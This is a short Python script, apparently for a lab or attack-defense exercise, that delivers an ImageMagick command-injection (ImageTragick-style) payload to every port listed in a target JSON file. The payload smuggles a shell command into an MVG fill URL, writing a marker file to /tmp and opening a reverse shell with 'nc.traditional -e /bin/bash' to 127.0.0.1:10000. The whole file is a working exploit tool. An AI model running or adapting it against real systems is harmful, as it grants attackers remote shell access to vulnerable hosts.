import sys, json, subprocess, os

TEMP="temp"

exploit = "push graphic-context\n" + \
    "viewbox 0 0 640 480\n" + \
    "fill \'url(https://example.com/image.jpg\";" + \
    "echo TEMPORAL > /tmp/AAABBB && nc.traditional -e /bin/bash 127.0.0.1 10000" + \
    "\")\'\n" + \
    "pop graphic-context"

interface = sys.argv[1]
state = None
ip = None
ports = None

with open(interface, "r") as f:
    state = json.load(f)

ip = state["address"]
ports = state["ports"]

with open(TEMP, "w") as f:
    f.write(exploit)

for e in ports:
    protocol = e[0]
    port = e[1]

    cmd = ["nc", "-w", "1", ip, port ]
    print ("[CMD] " + " ".join(cmd))

    with open(TEMP, "r") as f:
        p = subprocess.Popen(cmd, stdin = f)
        out, err = p.communicate()
